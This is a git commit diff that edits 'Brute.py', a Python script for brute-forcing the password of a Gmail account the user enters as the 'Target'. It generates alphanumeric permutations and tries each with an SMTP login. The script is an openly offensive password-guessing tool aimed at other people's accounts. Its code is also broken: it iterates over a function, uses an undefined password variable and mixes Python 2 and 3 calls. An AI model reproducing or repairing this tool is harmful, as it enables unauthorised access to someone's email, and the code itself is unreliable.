a239c9eb6009c1eda668cfb2e4d4be5f6f116a7f
x0rLS <42499784+x0rLS@users.noreply.github.com>
2018-08-19 18:13:30 +0200

    Update Brute.py

--- Brute.py
+++ Brute.py
@@ -7,14 +7,14 @@ smtpserver.starttls()
 
 user = input("Enter Target's Gmail Address: ")
 def print_perms(chars, minlen, maxlen): 
-    for n in range(minlen, maxlen+1): 
+    for n in xrange(minlen, maxlen+1): 
         for perm in itertools.product(chars, repeat=n): 
             print(''.join(perm)) 
 
 print_perms("abcdefghijklmnopqrstuvwxyz1234567890", 6, 12)
 
 for symbols in print_perms:
-    for i in xrange(100000000):
+
 
        try:
            smtpserver.login(user, password)
